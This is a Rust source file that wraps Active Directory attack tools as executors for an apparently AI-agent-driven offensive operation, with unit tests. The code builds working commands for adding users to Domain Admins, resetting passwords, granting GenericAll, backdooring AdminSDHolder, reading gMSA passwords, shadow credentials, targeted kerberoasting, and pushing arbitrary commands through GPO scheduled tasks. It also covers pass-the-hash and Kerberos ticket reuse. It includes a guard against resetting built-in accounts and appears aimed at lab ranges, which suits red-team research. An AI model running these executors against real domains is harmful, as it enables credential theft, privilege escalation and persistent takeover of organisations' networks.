//! ACL exploitation tool executors.
//!
//! Each function takes a JSON `Value` of arguments and returns a `ToolOutput`
//! produced by running the corresponding CLI tool as a subprocess.

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_bool, optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Convert a domain name to an LDAP base DN.
///
/// e.g. `"contoso.local"` -> `"DC=contoso,DC=local"`
fn domain_to_base_dn(domain: &str) -> String {
    domain
        .split('.')
        .map(|part| format!("DC={part}"))
        .collect::<Vec<_>>()
        .join(",")
}

/// Add a user to a group via `bloodyAD add groupMember`.
///
/// Required args: `domain`, `dc_ip`, `group`, `target_user`
/// Auth — one of (precedence: ticket_path > hash > password), see
/// [`credentials::bloodyad_base`]:
///   - `ticket_path` (Kerberos ccache path; bloodyAD `-k ccache=<path>`)
///   - `username` + `hash`/`nt_hash`/`ntlm_hash` (NTLM pass-the-hash)
///   - `username` + `password` (plaintext NTLM bind)
///
/// When `ticket_path` is provided it takes precedence — the cross-forest
/// credential resolver injects an inter-realm ccache for foreign-forest writes
/// that NTLM bind would reject with 0x52e. Without the Kerberos branch the
/// ccache injection is silently dropped (Bug B) and the dispatch wastes the
/// agent's tool budget on a guaranteed-failed bind.
pub async fn bloodyad_add_group_member(args: &Value) -> Result<ToolOutput> {
    build_bloodyad_add_group_member(args)?.execute().await
}

#[doc(hidden)]
pub fn build_bloodyad_add_group_member(args: &Value) -> Result<CommandBuilder> {
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let group = required_str(args, "group")?;
    let target_user = required_str(args, "target_user")?;
    // `action` (default "add") lets teardown pass "remove" to reverse the write.
    let action = optional_str(args, "action").unwrap_or("add");

    Ok(credentials::bloodyad_base(args, domain, dc_ip)?
        .arg(action)
        .arg("groupMember")
        .arg(group)
        .arg(target_user)
        .timeout_secs(60))
}

/// Set a user's password via `bloodyAD set password`.
///
/// Required args: `domain`, `dc_ip`, `target_user`, `new_password`
/// Auth — one of (precedence: ticket_path > hash > password), see
/// [`credentials::bloodyad_base`]:
///   - `ticket_path` (Kerberos ccache path; bloodyAD `-k ccache=<path>`)
///   - `username` + `hash`/`nt_hash`/`ntlm_hash` (NTLM pass-the-hash)
///   - `username` + `password` (plaintext NTLM bind)
///
/// When `ticket_path` is provided it takes precedence over hash/password.
/// The env var `KRB5CCNAME` is set to the path so bloodyad's Kerberos stack
/// picks it up without a separate `kinit` step.
pub async fn bloodyad_set_password(args: &Value) -> Result<ToolOutput> {
    build_bloodyad_set_password(args)?.execute().await
}

/// Principals whose password must never be overwritten by an automated reset.
///
/// Hijacking one of these does not advance an operation — we already model
/// takeover through hashes and tickets — but it destroys the account for
/// everyone else and cannot be undone without the provisioned value, which
/// state never holds. `Administrator` and `krbtgt` in particular are the
/// accounts a range is rebuilt around.
const PROTECTED_RESET_PRINCIPALS: &[&str] = &[
    "administrator",
    "krbtgt",
    "guest",
    "defaultaccount",
    "wdagutilityaccount",
];

/// Strip any `DOMAIN\`, `user@domain` or `CN=` decoration from a principal so
/// the protected-account check cannot be evaded by spelling.
fn bare_principal(target_user: &str) -> String {
    let mut name = target_user.trim();
    if let Some((_, rest)) = name.rsplit_once('\\') {
        name = rest;
    }
    if let Some((head, _)) = name.split_once('@') {
        name = head;
    }
    if let Some(rest) = name
        .strip_prefix("CN=")
        .or_else(|| name.strip_prefix("cn="))
    {
        name = rest.split(',').next().unwrap_or(rest);
    }
    name.trim().to_ascii_lowercase()
}

/// True when `target_user` is an account an automated password reset must
/// refuse: a built-in principal, or any machine account (trailing `$`).
pub fn is_protected_reset_principal(target_user: &str) -> bool {
    let name = bare_principal(target_user);
    if name.is_empty() {
        return false;
    }
    if name.ends_with('$') {
        return true;
    }
    PROTECTED_RESET_PRINCIPALS.contains(&name.as_str())
}

#[doc(hidden)]
pub fn build_bloodyad_set_password(args: &Value) -> Result<CommandBuilder> {
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let target_user = required_str(args, "target_user")?;
    let new_password = required_str(args, "new_password")?;

    if is_protected_reset_principal(target_user) {
        anyhow::bail!(
            "refusing to reset the password of protected principal '{target_user}': \
             built-in and machine accounts must never be overwritten. Use the hash \
             or ticket already in operation state to authenticate as this principal."
        );
    }

    Ok(credentials::bloodyad_base(args, domain, dc_ip)?
        .arg("set")
        .arg("password")
        .arg(target_user)
        .arg(new_password)
        .timeout_secs(60))
}

/// Grant GenericAll rights via `bloodyAD add genericAll`.
///
/// Required args: `domain`, `dc_ip`, `target_dn`, `principal`
/// Auth — one of (precedence: ticket_path > hash > password), see
/// [`credentials::bloodyad_base`]:
///   - `ticket_path` (Kerberos ccache path; bloodyAD `-k ccache=<path>`)
///   - `username` + `hash`/`nt_hash`/`ntlm_hash` (NTLM pass-the-hash)
///   - `username` + `password` (plaintext NTLM bind)
///
/// `ticket_path` takes precedence — same Bug B rationale as
/// `bloodyad_add_group_member`.
pub async fn bloodyad_add_genericall(args: &Value) -> Result<ToolOutput> {
    build_bloodyad_add_genericall(args)?.execute().await
}

#[doc(hidden)]
pub fn build_bloodyad_add_genericall(args: &Value) -> Result<CommandBuilder> {
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let target_dn = required_str(args, "target_dn")?;
    let principal = required_str(args, "principal")?;
    // `action` (default "add") lets teardown pass "remove" to reverse the grant.
    let action = optional_str(args, "action").unwrap_or("add");

    Ok(credentials::bloodyad_base(args, domain, dc_ip)?
        .arg(action)
        .arg("genericAll")
        .arg(target_dn)
        .arg(principal)
        .timeout_secs(60))
}

/// Add an ACL entry to the AdminSDHolder container via `bloodyAD add aclEntry`.
///
/// Required args: `domain`, `username`, `dc_ip`, `principal`
/// Optional args: `right` (default: `"FullControl"`)
/// Auth: `ticket_path` > `hash`/`nt_hash`/`ntlm_hash` > `password`, see
/// [`credentials::bloodyad_base`].
pub async fn adminsd_holder_add_ace(args: &Value) -> Result<ToolOutput> {
    build_adminsd_holder_add_ace(args)?.execute().await
}

#[doc(hidden)]
pub fn build_adminsd_holder_add_ace(args: &Value) -> Result<CommandBuilder> {
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let principal = required_str(args, "principal")?;
    let right = optional_str(args, "right").unwrap_or("GenericAll");

    if !right.eq_ignore_ascii_case("GenericAll") && !right.eq_ignore_ascii_case("FullControl") {
        anyhow::bail!(
            "adminsd_holder_add_ace grants full control via `bloodyAD add genericAll`; \
             right={right} is not expressible — use dacl_edit for a narrower ACE"
        );
    }

    let base_dn = domain_to_base_dn(domain);
    let adminsd_dn = format!("CN=AdminSDHolder,CN=System,{base_dn}");

    Ok(credentials::bloodyad_base(args, domain, dc_ip)?
        .arg("add")
        .arg("genericAll")
        .arg(&adminsd_dn)
        .arg(principal)
        .timeout_secs(120))
}

/// Read LDAP attributes of an object via `bloodyAD get object` — used by
/// operation teardown to validate that a mutation was reversed.
///
/// Required args: `domain`, `dc_ip`, `target`
/// Optional args: `attr` (single attribute to read; omit for all)
/// Auth: same as the other bloodyAD tools (username+password, ticket, or hash
///       via [`credentials::bloodyad_base`]).
pub async fn bloodyad_get_object(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let target = required_str(args, "target")?;

    let mut cmd = credentials::bloodyad_base(args, domain, dc_ip)?
        .arg("get")
        .arg("object")
        .arg(target);
    if let Some(attr) = optional_str(args, "attr").filter(|s| !s.is_empty()) {
        cmd = cmd.arg("--attr").arg(attr);
    }
    cmd.timeout_secs(60).execute().await
}

/// Read a gMSA account's managed password via `bloodyAD get object`.
///
/// Required args: `domain`, `username`, `dc_ip`, `gmsa_account`
/// Auth: `ticket_path` > `hash`/`nt_hash`/`ntlm_hash` > `password`, see
/// [`credentials::bloodyad_base`].
pub async fn gmsa_read_password_bloodyad(args: &Value) -> Result<ToolOutput> {
    build_gmsa_read_password_bloodyad(args)?.execute().await
}

#[doc(hidden)]
pub fn build_gmsa_read_password_bloodyad(args: &Value) -> Result<CommandBuilder> {
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let gmsa_account = required_str(args, "gmsa_account")?;

    Ok(credentials::bloodyad_base(args, domain, dc_ip)?
        .arg("get")
        .arg("object")
        .arg(gmsa_account)
        .arg("--attr")
        .arg("msDS-ManagedPassword")
        .timeout_secs(60))
}

/// Manipulate msDS-KeyCredentialLink via `pywhisker.py`.
///
/// Required args: `domain`, `username`, `dc_ip`, `target_samaccountname`
/// Auth — one of (precedence: ticket_path > hash > password):
/// - `ticket_path` — Kerberos ccache (`-k --no-pass` + `KRB5CCNAME`)
/// - `hash` — NTLM pass-the-hash (`--hashes :NTHASH`)
/// - `password` — plaintext bind
///
/// Optional args: `action` (default: `"add"`)
///
/// Without the hash/Kerberos branches, DACL-holding machine accounts and
/// captured NTLM-only principals can't drive Shadow Credentials writes even
/// though the underlying `pywhisker.py` supports both auth modes — the LLM
/// wrapper was the only bottleneck.
pub async fn pywhisker(args: &Value) -> Result<ToolOutput> {
    build_pywhisker(args)?.execute().await
}

#[doc(hidden)]
pub fn build_pywhisker(args: &Value) -> Result<CommandBuilder> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let target_sam = required_str(args, "target_samaccountname")?;
    let action = optional_str(args, "action").unwrap_or("add");
    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
    let hash = optional_str(args, "hash").filter(|s| !s.is_empty());

    let mut cmd = CommandBuilder::new("pywhisker")
        .flag("-d", domain)
        .flag("-u", username)
        .flag("--target", target_sam)
        .flag("--action", action)
        .flag("--dc-ip", dc_ip);

    // Removing a Key Credential requires the DeviceID minted by the add;
    // teardown supplies it from the captured `device_id` hint.
    if let Some(device_id) = optional_str(args, "device_id").filter(|s| !s.is_empty()) {
        cmd = cmd.flag("--device-id", device_id);
    }

    if let Some(tpath) = ticket_path {
        // Kerberos: pywhisker uses standard impacket-style `-k` + KRB5CCNAME.
        // `--no-pass` prevents interactive prompt when neither password nor
        // hash is on the command line.
        cmd = cmd
            .arg("-k")
            .arg("--no-pass")
            .env("KRB5CCNAME", tpath)
            .env("KRB5_CONFIG", format!("{tpath}.krb5.conf:/etc/krb5.conf"));
    } else if let Some(h) = hash {
        let nt = if h.contains(':') {
            h.to_string()
        } else {
            format!(":{h}")
        };
        // No `--no-pass` here: pywhisker's auth flags are one argparse
        // mutually-exclusive group (`--no-pass | -p | -H | ...`), so pairing it
        // with `--hashes` aborts with "argument --no-pass: not allowed with
        // -H/--hashes" before the tool does anything. `--hashes` already
        // suppresses the interactive prompt on its own. This made every
        // pass-the-hash pywhisker call a guaranteed failure — shadow-credential
        // exploitation and teardown's KeyCredential removal alike.
        cmd = cmd.arg("--hashes").arg(nt);
    } else {
        let password = required_str(args, "password")?;
        cmd = cmd.flag("-p", password);
    }

    Ok(cmd.timeout_secs(120))
}

/// Perform targeted Kerberoasting.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `target_user`
/// Optional args: `etype_hint` (array of Kerberos etype names, e.g.
///   `["aes256-cts-hmac-sha1-96", "aes128-cts-hmac-sha1-96"]`)
///
/// When `etype_hint` is absent we invoke `targetedKerberoast.py`, which
/// issues the TGS-REQ with the default etype priority (RC4 first).
///
/// When `etype_hint` is present we switch to `impacket-GetUserSPNs
/// -request-user <target_user> -supported-enctypes <bitmask>` because
/// `targetedKerberoast.py` exposes no etype-selection flag. Bug E: after a
/// `KDC_ERR_ETYPE_NOSUPP` rejection the orchestrator dispatches an AES-only
/// retry — passing the hint to a tool that always issues RC4 would just
/// loop until the SPN account locks out. The bitmask follows
/// `msDS-SupportedEncryptionTypes`: AES256=0x10, AES128=0x08, RC4=0x04.
pub async fn targeted_kerberoast(args: &Value) -> Result<ToolOutput> {
    build_targeted_kerberoast(args)?.execute().await
}

#[doc(hidden)]
pub fn build_targeted_kerberoast(args: &Value) -> Result<CommandBuilder> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let target_user = required_str(args, "target_user")?;
    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
    let hash = optional_str(args, "hash").filter(|s| !s.is_empty());

    let etype_mask = etype_hint_bitmask(args);

    let cmd = if let Some(mask) = etype_mask {
        // Switch to impacket-GetUserSPNs because targetedKerberoast.py has
        // no etype selector. `-request-user` limits the dispatch to the
        // single SPN account so we don't trigger a forest-wide kerberoast
        // pass that may relock other principals.
        let mut cmd = CommandBuilder::new("impacket-GetUserSPNs");

        if let Some(tpath) = ticket_path {
            let target = credentials::impacket_target(Some(domain), username, None, dc_ip);
            cmd = cmd
                .arg(target)
                .arg("-k")
                .arg("-no-pass")
                .env("KRB5CCNAME", tpath)
                .env("KRB5_CONFIG", format!("{tpath}.krb5.conf:/etc/krb5.conf"));
        } else if let Some(h) = hash {
            let target = credentials::impacket_target(Some(domain), username, None, dc_ip);
            cmd = cmd.arg(target);
            for a in credentials::hash_args(h) {
                cmd = cmd.arg(a);
            }
            cmd = cmd.arg("-no-pass");
        } else {
            let password = required_str(args, "password")?;
            let target =
                credentials::impacket_target(Some(domain), username, Some(password), dc_ip);
            cmd = cmd.arg(target);
        }

        cmd.arg("-dc-ip")
            .arg(dc_ip)
            .arg("-request-user")
            .arg(target_user)
            .arg("-supported-enctypes")
            .arg(mask.to_string())
            .timeout_secs(120)
    } else {
        let mut cmd = CommandBuilder::new("targetedKerberoast.py")
            .flag("-d", domain)
            .flag("-u", username)
            .flag("-t", target_user)
            .flag("-dc-ip", dc_ip);

        if let Some(tpath) = ticket_path {
            // targetedKerberoast.py is an impacket-based script; it honors
            // `-k` + `KRB5CCNAME` and `-no-pass` (impacket single-dash form).
            cmd = cmd
                .arg("-k")
                .arg("-no-pass")
                .env("KRB5CCNAME", tpath)
                .env("KRB5_CONFIG", format!("{tpath}.krb5.conf:/etc/krb5.conf"));
        } else if let Some(h) = hash {
            let nt = if h.contains(':') {
                h.to_string()
            } else {
                format!(":{h}")
            };
            cmd = cmd.arg("-H").arg(nt).arg("-no-pass");
        } else {
            let password = required_str(args, "password")?;
            cmd = cmd.flag("-p", password);
        }

        cmd.timeout_secs(120)
    };
    Ok(cmd)
}

/// Translate an `etype_hint` array into the `msDS-SupportedEncryptionTypes`
/// bitmask impacket-GetUserSPNs reads via `-supported-enctypes`. Returns
/// `None` when the hint is missing or empty — callers fall back to the
/// no-etype-selection path. Unknown etype strings are skipped with a
/// `tracing::warn!` so a future etype name addition doesn't silently bake
/// a zero bitmask into the dispatch.
fn etype_hint_bitmask(args: &Value) -> Option<u32> {
    let arr = args.get("etype_hint").and_then(|v| v.as_array())?;
    let mut mask: u32 = 0;
    for v in arr {
        let Some(name) = v.as_str() else { continue };
        let bit = match name.to_ascii_lowercase().as_str() {
            "aes256-cts-hmac-sha1-96" | "aes256" | "aes256-cts" => 0x10,
            "aes128-cts-hmac-sha1-96" | "aes128" | "aes128-cts" => 0x08,
            "rc4-hmac" | "rc4_hmac" | "rc4" | "arcfour-hmac" => 0x04,
            "des-cbc-md5" | "des_cbc_md5" => 0x02,
            "des-cbc-crc" | "des_cbc_crc" => 0x01,
            other => {
                tracing::warn!(
                    etype = %other,
                    "targeted_kerberoast: unknown etype_hint value, ignored"
                );
                continue;
            }
        };
        mask |= bit;
    }
    if mask == 0 {
        None
    } else {
        Some(mask)
    }
}

/// Abuse Group Policy Objects via `SharpGPOAbuse.exe` (run through mono on Linux).
///
/// Required args: `gpo_name`, `domain`, `username`, `password`, `dc_ip`, `user_to_add`
/// Optional args: `action` (default: `"AddLocalAdmin"`), `computer_target`
pub async fn sharpgpoabuse(args: &Value) -> Result<ToolOutput> {
    let gpo_name = required_str(args, "gpo_name")?;
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    // SharpGPOAbuse uses integrated auth via domain/DC — password is required
    // by the LLM schema for credential consistency but not passed to the binary.
    let _password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let user_to_add = optional_str(args, "user_to_add").unwrap_or(username);
    let action = optional_str(args, "action").unwrap_or("AddLocalAdmin");
    let computer_target = optional_str(args, "computer_target");

    let action_flag = format!("--{action}");

    CommandBuilder::new("mono")
        .arg("SharpGPOAbuse.exe")
        .arg(&action_flag)
        .flag("--UserAccount", user_to_add)
        .flag("--GPOName", gpo_name)
        .flag("--Domain", domain)
        .flag("--DomainController", dc_ip)
        .flag_opt("--ComputerTarget", computer_target)
        .timeout_secs(120)
        .execute()
        .await
}

/// Create an immediate scheduled task via GPO abuse with `pygpoabuse`.
///
/// Required args: `domain`, `username`, `password`, `gpo_id`, `command`, `dc_ip`
/// Optional args: `task_name`, `force` (bool)
pub async fn pygpoabuse_immediate_task(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let gpo_id = required_str(args, "gpo_id")?;
    let command = required_str(args, "command")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let task_name = optional_str(args, "task_name").unwrap_or("WindowsUpdate");
    let force = optional_bool(args, "force").unwrap_or(true);

    let target = credentials::impacket_target(Some(domain), username, Some(password), domain);

    CommandBuilder::new("pygpoabuse")
        .arg(&target)
        .flag("-gpo-id", gpo_id)
        .flag("-command", command)
        .flag("-taskname", task_name)
        .flag("-dc-ip", dc_ip)
        .arg_if(force, "-f")
        .timeout_secs(120)
        .execute()
        .await
}

/// Modify an arbitrary attribute on an AD object via `bloodyAD set object`.
///
/// Required args: `domain`, `username`, `dc_ip`, `target`, `attribute`,
/// `value`.
/// Auth: `ticket_path` > `hash`/`nt_hash`/`ntlm_hash` > `password`, see
/// [`credentials::bloodyad_base`].
///
/// `target` is the SAM account name or DN of the object being modified.
/// `attribute` is the LDAP attribute name (e.g. `userPrincipalName`,
/// `userAccountControl`, `servicePrincipalName`).
/// `value` is the new value to write.
///
/// Used by ESC9 (UPN spoofing — set `userPrincipalName` to
/// `administrator@<domain>` on a user we have GenericAll on), ESC10
/// Case 2 (clear `userPrincipalName` to bypass implicit cert mapping),
/// and any other primitive where the LLM needs to write a single
/// attribute without granting itself a DACL right first.
pub async fn bloodyad_set_object_attr(args: &Value) -> Result<ToolOutput> {
    build_bloodyad_set_object_attr(args)?.execute().await
}

#[doc(hidden)]
pub fn build_bloodyad_set_object_attr(args: &Value) -> Result<CommandBuilder> {
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let target = required_str(args, "target")?;
    let attribute = required_str(args, "attribute")?;
    let value = required_str(args, "value")?;

    Ok(credentials::bloodyad_base(args, domain, dc_ip)?
        .arg("set")
        .arg("object")
        .arg(target)
        .arg(attribute)
        .flag("-v", value)
        .timeout_secs(60))
}

/// Edit DACLs via `dacledit.py`.
///
/// Required args: `domain`, `username`, `dc_ip`, `principal`, `rights`, `target_dn`
/// Optional args: `action` (default: `"write"`)
/// Auth — one of (precedence: ticket_path > hash > password):
/// - `ticket_path` — Kerberos ccache (`-k -no-pass` + `KRB5CCNAME`)
/// - `hash`/`nt_hash`/`ntlm_hash` — NTLM pass-the-hash (`-hashes LM:NT`)
/// - `password` — plaintext bind, folded into the impacket target string
///
/// `dacledit.py` is an impacket example script and exposes the standard
/// impacket authentication group, so the hash and ccache branches need no
/// wrapper-side emulation.
pub async fn dacl_edit(args: &Value) -> Result<ToolOutput> {
    build_dacl_edit(args)?.execute().await
}

#[doc(hidden)]
pub fn build_dacl_edit(args: &Value) -> Result<CommandBuilder> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let principal = required_str(args, "principal")?;
    let rights = required_str(args, "rights")?;
    let target_dn = required_str(args, "target_dn")?;
    let action = optional_str(args, "action").unwrap_or("write");

    let mut cmd = CommandBuilder::new("dacledit.py")
        .flag("-action", action)
        .flag("-principal", principal)
        .flag("-rights", rights)
        .flag("-target-dn", target_dn);

    if let Some(tpath) = optional_str(args, "ticket_path").filter(|s| !s.is_empty()) {
        let (ccname_key, ccname_val) = credentials::kerberos_env(tpath);
        let (cfg_key, cfg_val) = credentials::krb5_config_env(tpath);
        cmd = cmd
            .arg(credentials::impacket_target(
                Some(domain),
                username,
                None,
                dc_ip,
            ))
            .arg("-k")
            .arg("-no-pass")
            .env(ccname_key, ccname_val)
            .env(cfg_key, cfg_val);
    } else if let Some(raw) = credentials::ntlm_hash_arg(args) {
        cmd = cmd
            .arg(credentials::impacket_target(
                Some(domain),
                username,
                None,
                dc_ip,
            ))
            .args(credentials::hash_args(&credentials::lm_nt_hash_pair(raw)?))
            .arg("-no-pass");
    } else {
        let password = optional_str(args, "password")
            .filter(|s| !s.is_empty())
            .ok_or_else(|| anyhow::anyhow!("{}", credentials::NO_AUTH_MATERIAL))?;
        cmd = cmd.arg(credentials::impacket_target(
            Some(domain),
            username,
            Some(password),
            dc_ip,
        ));
    }

    Ok(cmd.flag("-dc-ip", dc_ip).timeout_secs(120))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::args::{optional_bool, optional_str, required_str};
    use serde_json::json;

    // ── domain_to_base_dn ──────────────────────────────────────────────

    #[test]
    fn domain_to_base_dn_simple() {
        assert_eq!(domain_to_base_dn("contoso.local"), "DC=contoso,DC=local");
    }

    #[test]
    fn domain_to_base_dn_nested() {
        assert_eq!(
            domain_to_base_dn("child.contoso.local"),
            "DC=child,DC=contoso,DC=local"
        );
    }

    #[test]
    fn domain_to_base_dn_single() {
        assert_eq!(domain_to_base_dn("local"), "DC=local");
    }

    #[test]
    fn domain_to_base_dn_fabrikam() {
        assert_eq!(domain_to_base_dn("fabrikam.local"), "DC=fabrikam,DC=local");
    }

    #[test]
    fn domain_to_base_dn_deep_nesting() {
        assert_eq!(
            domain_to_base_dn("sub.child.contoso.local"),
            "DC=sub,DC=child,DC=contoso,DC=local"
        );
    }

    #[test]
    fn adminsd_holder_dn_format() {
        let domain = "contoso.local";
        let base_dn = domain_to_base_dn(domain);
        let adminsd_dn = format!("CN=AdminSDHolder,CN=System,{base_dn}");
        assert_eq!(adminsd_dn, "CN=AdminSDHolder,CN=System,DC=contoso,DC=local");
    }

    #[test]
    fn adminsd_holder_dn_fabrikam() {
        let base_dn = domain_to_base_dn("fabrikam.local");
        let adminsd_dn = format!("CN=AdminSDHolder,CN=System,{base_dn}");
        assert_eq!(
            adminsd_dn,
            "CN=AdminSDHolder,CN=System,DC=fabrikam,DC=local"
        );
    }

    // ── bloodyad_add_group_member arg validation ───────────────────────

    #[test]
    fn bloodyad_add_group_member_missing_domain() {
        let args = json!({
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "group": "Domain Admins",
            "target_user": "jsmith"
        });
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn bloodyad_add_group_member_all_args_parse() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "group": "Domain Admins",
            "target_user": "jsmith"
        });
        assert_eq!(required_str(&args, "domain").unwrap(), "contoso.local");
        assert_eq!(required_str(&args, "username").unwrap(), "admin");
        assert_eq!(required_str(&args, "password").unwrap(), "P@ssw0rd!");
        assert_eq!(required_str(&args, "dc_ip").unwrap(), "192.168.58.10");
        assert_eq!(required_str(&args, "group").unwrap(), "Domain Admins");
        assert_eq!(required_str(&args, "target_user").unwrap(), "jsmith");
    }

    // ── bloodyad_set_password arg validation ───────────────────────────

    #[test]
    fn bloodyad_set_password_missing_new_password() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "target_user": "victim"
        });
        assert!(required_str(&args, "new_password").is_err());
    }

    #[test]
    fn bloodyad_set_password_all_args_parse() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "target_user": "victim",
            "new_password": "NewP@ss123!"
        });
        assert_eq!(required_str(&args, "target_user").unwrap(), "victim");
        assert_eq!(required_str(&args, "new_password").unwrap(), "NewP@ss123!");
    }

    fn set_password_args(target_user: &str) -> serde_json::Value {
        json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "target_user": target_user,
            "new_password": "NewP@ss123!"
        })
    }

    #[test]
    fn set_password_refuses_builtin_administrator() {
        for spelling in [
            "Administrator",
            "administrator",
            "ADMINISTRATOR",
            "CONTOSO\\Administrator",
            "Administrator@contoso.local",
            "CN=Administrator,CN=Users,DC=contoso,DC=local",
        ] {
            let Err(err) = super::build_bloodyad_set_password(&set_password_args(spelling)) else {
                panic!("must refuse built-in Administrator: {spelling}");
            };
            assert!(
                err.to_string().contains("protected principal"),
                "unexpected error for {spelling}: {err}"
            );
        }
    }

    #[test]
    fn set_password_refuses_krbtgt_and_other_builtins() {
        for name in ["krbtgt", "Guest", "DefaultAccount", "WDAGUtilityAccount"] {
            assert!(
                super::build_bloodyad_set_password(&set_password_args(name)).is_err(),
                "must refuse built-in {name}"
            );
        }
    }

    #[test]
    fn set_password_refuses_machine_accounts() {
        for name in ["DC01$", "WS01$", "CONTOSO\\SQL01$"] {
            assert!(
                super::build_bloodyad_set_password(&set_password_args(name)).is_err(),
                "must refuse machine account {name}"
            );
        }
    }

    #[test]
    fn set_password_still_allows_a_normal_user() {
        assert!(super::build_bloodyad_set_password(&set_password_args("alice")).is_ok());
        assert!(
            super::build_bloodyad_set_password(&set_password_args("CONTOSO\\bob")).is_ok(),
            "domain-qualified ordinary users must still be resettable"
        );
    }

    #[test]
    fn protected_principal_does_not_over_match_ordinary_names() {
        for name in [
            "administrators",
            "admin",
            "alice.administrator",
            "guestuser",
        ] {
            assert!(
                !super::is_protected_reset_principal(name),
                "{name} must not be treated as protected"
            );
        }
    }

    // ── bloodyad_add_genericall arg validation ─────────────────────────

    #[test]
    fn bloodyad_genericall_missing_target_dn() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "principal": "jsmith"
        });
        assert!(required_str(&args, "target_dn").is_err());
    }

    #[test]
    fn bloodyad_genericall_all_args() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "target_dn": "CN=Users,DC=contoso,DC=local",
            "principal": "jsmith"
        });
        assert_eq!(
            required_str(&args, "target_dn").unwrap(),
            "CN=Users,DC=contoso,DC=local"
        );
        assert_eq!(required_str(&args, "principal").unwrap(), "jsmith");
    }

    // ── adminsd_holder_add_ace arg validation ──────────────────────────

    #[test]
    fn adminsd_holder_right_default() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "principal": "jsmith"
        });
        let cmd = super::build_adminsd_holder_add_ace(&args).unwrap();
        let argv = cmd.args_for_test();
        assert!(argv.iter().any(|a| a == "genericAll"));
    }

    #[test]
    fn adminsd_holder_accepts_fullcontrol_as_genericall_alias() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "principal": "jsmith",
            "right": "FullControl"
        });
        let cmd = super::build_adminsd_holder_add_ace(&args).unwrap();
        let argv = cmd.args_for_test();
        assert!(argv.iter().any(|a| a == "genericAll"));
    }

    #[test]
    fn adminsd_holder_dn_construction() {
        let domain = "contoso.local";
        let base_dn = domain_to_base_dn(domain);
        let adminsd_dn = format!("CN=AdminSDHolder,CN=System,{base_dn}");
        assert!(adminsd_dn.starts_with("CN=AdminSDHolder,CN=System,DC="));
        assert!(adminsd_dn.ends_with("DC=local"));
    }

    // ── gmsa_read_password arg validation ──────────────────────────────

    #[test]
    fn gmsa_read_password_missing_account() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "gmsa_account").is_err());
    }

    #[test]
    fn gmsa_read_password_args() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "gmsa_account": "svc_web$"
        });
        assert_eq!(required_str(&args, "gmsa_account").unwrap(), "svc_web$");
    }

    // ── pywhisker arg validation ───────────────────────────────────────

    #[test]
    fn pywhisker_default_action() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "target_samaccountname": "dc01$"
        });
        let action = optional_str(&args, "action").unwrap_or("add");
        assert_eq!(action, "add");
    }

    #[test]
    fn pywhisker_custom_action() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "target_samaccountname": "dc01$",
            "action": "list"
        });
        let action = optional_str(&args, "action").unwrap_or("add");
        assert_eq!(action, "list");
    }

    #[test]
    fn pywhisker_missing_target_sam() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "target_samaccountname").is_err());
    }

    // ── targeted_kerberoast arg validation ─────────────────────────────

    #[test]
    fn targeted_kerberoast_missing_target_user() {
        let args = json!({
            "domain": "contoso.local",
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "target_user").is_err());
